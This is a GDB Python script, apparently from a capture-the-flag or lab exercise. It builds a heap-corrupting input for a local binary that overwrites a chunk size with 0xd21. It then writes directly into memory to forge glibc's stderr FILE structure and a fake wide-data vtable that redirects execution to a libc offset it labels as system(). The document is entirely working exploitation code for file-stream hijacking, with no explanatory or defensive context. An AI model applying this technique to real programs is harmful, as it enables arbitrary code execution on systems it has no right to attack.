import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

OPS = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd21)),
    (0x1000, b"\x00"*8),
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("./_z_441/input.bin", "wb").write(build(OPS))

def wq(addr, val):
    gdb.execute("set *(unsigned long*)%#x = %#x" % (addr, val & 0xffffffffffffffff))

fired = [False]

class SysBP(gdb.Breakpoint):
    def stop(self):
        if fired[0]:
            gdb.execute("kill")
            return True
        fired[0] = True
        gdb.write("\n~~~~~ SYSTEM HIT ~~~~~\n")
        for r in ['rax','rbx','rcx','rdx','rsi','rdi','rbp','rsp','r8','r9','r10','r11','r12','r13','r14','r15']:
            gdb.write("  %s = %#x\n" % (r, int(gdb.parse_and_eval("$"+r))))
        gdb.write("  [rdi] = %s\n" % gdb.execute("x/s $rdi", to_string=True).strip())
        gdb.write("  rsp-> %s\n" % gdb.execute("x/6gx $rsp", to_string=True).strip())
        gdb.write("  rbp-0x80 -> %s\n" % gdb.execute("x/4gx $rbp-0x80", to_string=True).strip())
        gdb.write("stack trace:\n" + gdb.execute("bt", to_string=True))
        return True

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        pkt = rdi - 8
        if hits[0] == 2:
            heap = pkt - 0x2c0
            stderr = int(gdb.parse_and_eval("(unsigned long)&_IO_2_1_stderr_"))
            libc = stderr - 0x21a6a0
            fake_wide = heap + 0x600
            fake_wvt  = heap + 0x760
            for off in range(0, 0x900, 8):
                wq(heap + off, 0)
            wq(stderr + 0x00, 0x733b06d0)
            wq(stderr + 0x88, heap + 0x700)
            wq(stderr + 0x98, heap + 0x800)
            wq(stderr + 0xa0, fake_wide)
            wq(stderr + 0xc0, 0)
            wq(stderr + 0xd8, libc + 0x2160c0)
            wq(fake_wide + 0xe0, fake_wvt)
            wq(fake_wvt + 0x68, libc + 0x50d60)
            SysBP("*%#x" % (libc + 0x50d60))
            gdb.write("patched; heap=%#x libc=%#x\n" % (heap, libc))
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < ./_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
